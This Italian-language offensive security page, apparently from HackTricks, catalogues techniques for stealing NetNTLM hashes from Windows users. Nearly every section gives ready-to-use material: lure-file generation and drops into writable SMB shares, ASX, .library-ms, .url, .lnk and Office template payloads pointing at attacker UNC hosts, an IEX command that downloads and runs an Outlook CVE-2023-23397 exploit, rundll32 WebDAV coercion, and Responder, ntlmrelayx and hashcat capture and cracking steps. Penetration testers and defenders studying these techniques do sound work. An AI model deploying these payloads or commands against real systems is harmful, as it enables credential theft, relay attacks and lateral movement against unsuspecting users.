# Luoghi da cui sottrarre credenziali NTLM

{{#include ../../banners/hacktricks-training.md}}

**Scopri tutte le ottime idee disponibili su [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), dal download online di un file Microsoft Word alla fonte delle fughe NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Share SMB scrivibile + esche UNC attivate da Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se puoi **scrivere in una share che gli utenti o i processi pianificati esplorano in Explorer**, inserisci file i cui metadati puntano al tuo UNC (ad es. `\\ATTACKER\share`). La visualizzazione della cartella attiva **l'autenticazione SMB implicita** e invia un **NetNTLMv2** al tuo listener.<sup>[[1]](#references)</sup>

1. **Genera esche** (include SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/ecc.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Inseriscili nella condivisione scrivibile** (qualsiasi cartella che la vittima apre):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Ascolta e cracka**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows può contattare più file contemporaneamente; per tutto ciò che Explorer visualizza in anteprima (`BROWSE TO FOLDER`) non è necessario fare clic.

### Playlist di Windows Media Player (.ASX/.WAX)

Se riesci a far aprire o visualizzare in anteprima a un target una playlist di Windows Media Player che controlli, puoi ottenere un leak di Net‑NTLMv2 indicando una UNC path come voce. WMP proverà a recuperare il contenuto multimediale referenziato tramite SMB e si autenticherà implicitamente.<sup>[[3]](#references)[[4]](#references)</sup>

Esempio di payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Flusso di raccolta e cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Leak NTLM tramite .library-ms incorporato in ZIP (CVE-2025-24071/24055)

Esplora file di Windows gestisce in modo insicuro i file .library-ms quando vengono aperti direttamente da un archivio ZIP. Se la definizione della libreria punta a un percorso UNC remoto (ad es. \\attacker\share), è sufficiente esplorare o avviare il file .library-ms contenuto nello ZIP perché Esplora file enumeri il percorso UNC e invii l'autenticazione NTLM all'attaccante. In questo modo si ottiene un NetNTLMv2, che può essere sottoposto a cracking offline o potenzialmente a relay.<sup>[[2]](#references)</sup>

File .library-ms minimo che punta a un UNC controllato dall'attaccante

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Passaggi operativi
- Crea il file .library-ms con l’XML precedente (imposta il tuo IP/hostname).
- Comprimi il file in uno ZIP (su Windows: Invia a → Cartella compressa) e consegna lo ZIP al target.
- Avvia un listener per catturare NTLM e attendi che la vittima apra il file .library-ms dall’interno dello ZIP.


### Percorso del file audio del promemoria del calendario di Outlook (CVE-2023-23397) – leak Net-NTLMv2 zero-click

Microsoft Outlook per Windows elaborava la proprietà MAPI estesa PidLidReminderFileParameter negli elementi del calendario. Se quella proprietà puntava a un percorso UNC (ad es., \\attacker\share\alert.wav), Outlook contattava la condivisione SMB all’attivazione del promemoria, causando il leak di Net-NTLMv2 dell’utente senza alcun clic. La vulnerabilità è stata corretta il 14 marzo 2023, ma resta molto rilevante per i sistemi legacy/non aggiornati e per le indagini forensi su incidenti storici.<sup>[[5]](#references)</sup>

Exploit rapido con PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Lato listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Note
- Alla vittima basta che Outlook per Windows sia in esecuzione quando scatta il promemoria.
- Il leak fornisce Net-NTLMv2, utilizzabile per il cracking offline o il relay (non per il pass-the-hash).


### Leak NTLM zero-click basato su icone .LNK/.URL (CVE‑2025‑50154 – bypass di CVE‑2025‑24054)

Windows Explorer visualizza automaticamente le icone dei collegamenti. Ricerche recenti hanno dimostrato che, anche dopo la patch di Microsoft di aprile 2025 per i collegamenti con icone UNC, era ancora possibile attivare l’autenticazione NTLM senza clic ospitando la destinazione del collegamento su un percorso UNC e mantenendo l’icona in locale (il bypass della patch è stato assegnato a CVE‑2025‑50154). È sufficiente visualizzare la cartella perché Explorer recuperi i metadati dalla destinazione remota, inviando NTLM al server SMB dell’attaccante.<sup>[[6]](#references)</sup>

Payload minimo Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Programmazione del payload di una scorciatoia (.lnk) tramite PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Idee per la distribuzione
- Inserisci il collegamento in uno ZIP e induci la vittima a esplorarne il contenuto.
- Colloca il collegamento in una condivisione scrivibile che la vittima aprirà.
- Combinalo con altri file esca nella stessa cartella, così che Explorer ne mostri le anteprime.

### Leak NTLM senza clic tramite percorso dell’icona ExtraData in .LNK (CVE‑2026‑25185)

Windows carica i metadati `.lnk` durante la **visualizzazione/anteprima** (rendering dell’icona), non solo durante l’esecuzione. CVE‑2026‑25185 mostra un percorso di parsing in cui i blocchi **ExtraData** inducono la shell a risolvere un percorso dell’icona e ad accedere al filesystem **durante il caricamento**, generando traffico NTLM in uscita se il percorso è remoto.

Condizioni chiave di attivazione (osservate in `CShellLink::_LoadFromStream`):
- Includere **DARWIN_PROPS** (`0xa0000006`) in ExtraData (abilita la routine di aggiornamento dell’icona).
- Includere **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) con **TargetUnicode** valorizzato.
- Il loader espande le variabili d’ambiente in `TargetUnicode` e chiama `PathFileExistsW` sul percorso risultante.

Se `TargetUnicode` risolve in un percorso UNC (ad es. `\\attacker\share\icon.ico`), **la semplice visualizzazione di una cartella** contenente il collegamento provoca un’autenticazione in uscita. Lo stesso percorso di caricamento può essere attivato anche dall’**indicizzazione** e dalla **scansione AV**, rendendolo una superficie di leak senza clic concretamente sfruttabile.<sup>[[7]](#references)</sup>

Nel progetto **LnkMeMaybe** sono disponibili strumenti di ricerca (parser/generator/UI) per creare ed esaminare queste strutture senza usare la GUI di Windows.<sup>[[8]](#references)</sup>


### Coercizione dell’autenticazione WebDAV / convalida delle credenziali tramite `davclnt.dll,DavSetCookie`

Il **client WebDAV** nativo può essere usato per forzare la sessione di accesso corrente ad autenticarsi presso un endpoint **HTTP/WebDAV** arbitrario:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Perché è utile:
- Contro un **server WebDAV controllato dall'attaccante**, può attivare **NTLM over HTTP** senza dover distribuire un client personalizzato.
- Contro **host interni**, è un modo discreto per **verificare dove vengono accettate le credenziali rubate** prima di muoversi lateralmente.<sup>[[9]](#references)</sup>
- Il comando è una buona alternativa quando l'uscita **SMB** è filtrata, ma **HTTP/WebDAV** è ancora raggiungibile.

Note operative:
- Il servizio **WebClient** deve essere in esecuzione sull'host sorgente.
- `rundll32.exe` carica `davclnt.dll` e fa gestire a Windows l'autenticazione WebDAV usando le **credenziali dell'utente corrente**.<sup>[[10]](#references)</sup>
- Se lo indirizzi verso un'infrastruttura che controlli, usa un listener/relay HTTP compatibile con NTLM, come:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Da una prospettiva di rilevamento, esecuzioni ripetute di `rundll32.exe davclnt.dll,DavSetCookie` dirette a molti sistemi interni sono un forte indicatore di **convalida delle credenziali / preparazione a movimenti laterali simili a uno spray**, piuttosto che di un normale comportamento dell’utente.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) per forzare NTLM

I documenti Office possono fare riferimento a un template esterno. Se si imposta il template allegato su un percorso UNC, l’apertura del documento eseguirà l’autenticazione tramite SMB.

Modifiche minime alle relazioni DOCX (all’interno di word/):

1) Modificare word/settings.xml e aggiungere il riferimento al template allegato:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Modifica word/_rels/settings.xml.rels e fai puntare rId1337 al tuo UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Reimpacchetta in .docx e consegnalo. Avvia il tuo listener di cattura SMB e attendi che il file venga aperto.

Per idee su come fare relay o abusare di NTLM dopo la cattura, consulta:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Esca con share scrivibile + cattura Responder → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 fino a DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — NTLM leak di WMP → junction NTFS verso la webroot per RCE → FullPowers + GodPotato per ottenere SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 vulnerabilità NTLM: minacce di escalation dei privilegi senza patch in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitiga l'EoP di Outlook (CVE‑2023‑23397) e spiega il leak NTLM tramite PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, un solo NTLM: bypass della patch di sicurezza Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: una revisione di CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Strumenti LnkMeMaybe di TrustedSec](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Quando chiama il supporto IT: analisi di una campagna ModeloRAT da Teams alla compromissione del dominio](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – file header davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – richiesta WebDAV di Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Luoghi interessanti per rubare hash NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
